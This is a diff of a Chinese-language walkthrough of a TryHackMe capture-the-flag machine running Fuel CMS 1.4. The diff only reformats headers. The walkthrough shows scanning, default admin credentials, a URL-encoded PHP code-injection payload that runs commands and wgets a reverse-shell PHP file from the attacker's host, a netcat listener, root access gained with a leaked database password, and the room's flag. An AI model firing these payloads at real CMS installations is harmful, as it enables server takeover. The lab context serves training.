@@ -1,7 +1,7 @@
-#服务发现
+# 服务发现
 ```
 ┌──(root💀kali)-[~/tryhackme/lgnitevm]
-└─# nmap -sV -Pn 10.10.248.97 
+└─#  nmap -sV -Pn 10.10.248.97 
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-24 02:05 EDT
 Nmap scan report for 10.10.248.97
@@ -14,10 +14,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 17.57 seconds
 ```
 
-#目录爆破
+# 目录爆破
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -u http://10.10.248.97 -e* -t 100 -w /usr/share/wordlists/Web-Content/directory-list-lowercase-2.3-medium.txt
+└─#  python3 dirsearch.py -u http://10.10.248.97 -e* -t 100 -w /usr/share/wordlists/Web-Content/directory-list-lowercase-2.3-medium.txt
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -38,7 +38,7 @@ Target: http://10.10.248.97
 CTRL+C detected: Pausing threads, please wait...        
 ```
 
-#首页分析
+# 首页分析
 首先显示是一个叫```Fuel CMS```的CMS,版本号是```1.4```
 暴露了目录的一些路径信息
 暴露了原始登录密码：
@@ -57,10 +57,10 @@ Password: admin (you can and should change this password and admin user informat
 
 但是进去貌似找不到可以修改php源码的入口
 
-#在kali搜索这个cms的可利用漏洞
+# 在kali搜索这个cms的可利用漏洞
 ```
 ┌──(root💀kali)-[~/tryhackme/lgnitevm]
-└─# searchsploit Fuel CMS 1.4   
+└─#  searchsploit Fuel CMS 1.4   
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                                                                                                            |  Path
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -75,23 +75,23 @@ Shellcodes: No Results
 
 python和ruby脚本我这边执行不了，不过ruby的payload单独拿下来到浏览器可以执行
 
-#payload,执行ls命令
+# payload,执行ls命令
 ```view-source:http://10.10.248.97/fuel/pages/select/?filter=%27%2Bpi(print(%24a%3D%27system%27))%2B%24a('ls')%2B%27```
 
 
-#下载一个正经的webshell
+# 下载一个正经的webshell
 ```view-source:http://10.10.248.97/fuel/pages/select/?filter=%27%2Bpi(print(%24a%3D%27system%27))%2B%24a('wget http://10.13.21.169:8000/reverse_shell.php ')%2B%27```
 
-#执行反弹
+# 执行反弹
 http://10.10.248.97/reverse_shell.php
 
-#获取webshell，拿到flag
+# 获取webshell，拿到flag
 ```
 ┌──(root💀kali)-[~]
-└─# nc -lnvp 1234                                                                                                                                                                                                                       1 ⨯
+└─#  nc -lnvp 1234                                                                                                                                                                                                                       1 ⨯
 listening on [any] 1234 ...
 connect to [10.13.21.169] from (UNKNOWN) [10.10.248.97] 58620
-Linux ubuntu 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+Linux ubuntu 4.15.0-45-generic # 48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
  00:38:36 up  1:39,  0 users,  load average: 0.00, 0.00, 0.32
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -132,15 +132,15 @@ $db['default'] = array(
 
 ```
 
-#尝试用root:mememe登录root账号，成功登录，拿到root.txt
+# 尝试用root:mememe登录root账号，成功登录，拿到root.txt
 
 ```
 $ su root
 su root
 Password: mememe
 
-root@ubuntu:/# cat /root/root.txt
+root@ubuntu:/#  cat /root/root.txt
 cat /root/root.txt
 b9bbcb33e11b80be759c4e844862482d 
-root@ubuntu:/# 
+root@ubuntu:/#  
 ```
